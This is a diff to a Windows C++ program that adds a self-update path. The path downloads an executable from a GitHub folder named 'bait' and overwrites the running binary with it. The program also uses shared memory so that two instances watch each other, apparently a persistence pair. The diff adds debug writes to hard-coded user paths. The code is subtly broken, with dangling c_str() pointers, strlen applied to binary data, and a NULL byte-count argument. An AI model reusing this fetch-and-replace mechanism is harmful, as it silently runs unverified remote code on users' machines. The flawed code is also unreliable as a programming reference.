@@ -4,19 +4,21 @@
 #include <iostream>
 #include <string>
 
-std::string fetchUrl(const std::string& url) {
+const int version=0;
+
+std::string fetchUrl(const char* url) {
     std::string response;
     HINTERNET hInternet, hURL;
 
     // Initialize WinINet
-    hInternet = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet == NULL) {
         //Failed to initialize WinINet
         return "";
     }
 
     // Open the URL
-    hURL = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    hURL = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (hURL == NULL) {
         //Failed to open URL
         InternetCloseHandle(hInternet);
@@ -47,12 +49,34 @@ std::string fetchUrl(const std::string& url) {
 
 int main(int argc, char* argv[])
 {
+    char path[MAX_PATH]="";
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+
     int me;
     if(argc<2){
         me=0;
-    }else if(argv[1]=="update"){
-        fetchUrl()
+    }else if(std::string(argv[1])=="update"){
+        HANDLE file = CreateFile("C:/Users/tt/Downloads/start", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
+        CloseHandle(file);
+
+        const char* a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/version").c_str();
+        if(version<std::stoi(a)){
+            a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe").c_str();
+            MoveFileExA(path, (std::string(path)+"uyjhgbg").c_str(), MOVEFILE_REPLACE_EXISTING);
+            HANDLE file = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
+            WriteFile(file, a, strlen(a), NULL, NULL);
+            CloseHandle(file);
+            return 0;
+        }
+
+        file = CreateFile("C:/Users/tt/Downloads/m.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
+        WriteFile(file, a, strlen(a), NULL, NULL);
+        CloseHandle(file);
+        return 0;
     }else{
+        HANDLE file = CreateFile("C:/Users/tt/Downloads/stoi", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
+        WriteFile(file, argv[1], strlen(argv[1]), NULL, NULL);
+        CloseHandle(file);
         me=std::stoi(argv[1]);
     }
     HANDLE shm_handle  = CreateFileMappingW(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,8,L"JrRKULBcTr");
@@ -61,12 +85,7 @@ int main(int argc, char* argv[])
     uint32_t* myMem = reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(shm_ptr) + (me*4));
     uint32_t* theirMem = reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(shm_ptr) + (((me+1)%2)*4));
 
-
-    char path[MAX_PATH]="";
-
-    GetModuleFileNameA(NULL, path, MAX_PATH);
-
-    HANDLE file = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    //HANDLE file = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     char* meStr=const_cast<char*>((std::string(path)+std::string(" ")+std::to_string((me+1)%2)).c_str());
     uint32_t lastMyMem = 0;
